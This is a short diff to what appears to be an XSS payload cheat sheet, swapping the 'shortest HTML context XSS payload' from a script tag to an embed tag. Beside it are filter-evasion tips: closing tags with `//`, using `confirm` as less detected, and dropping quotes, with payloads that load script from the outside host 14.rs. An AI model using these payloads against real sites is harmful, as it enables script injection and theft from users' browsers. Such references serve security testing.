@@ -356,7 +356,7 @@ If the your dummy tags lands in the source code as it is, go for any of these pa
 - You can use `//` to close a tag instead of `>`.
 - I have found that `confirm` is the least detected pop-up function so stop using `alert`.
 - Quotes around attribute value aren't necessary as long as it doesn't contain spaces. You can use `<script src=//14.rs>` instead of `<script src="//14.rs">`
-- The shortest HTML context XSS payload is `<script src=//14.rs>` (19 chars)
+- The shortest HTML context XSS payload is `<embed src=//14.rs>` (19 chars)
 
 ### Awesome Credits
 All the payloads are crafted by me unless specified.
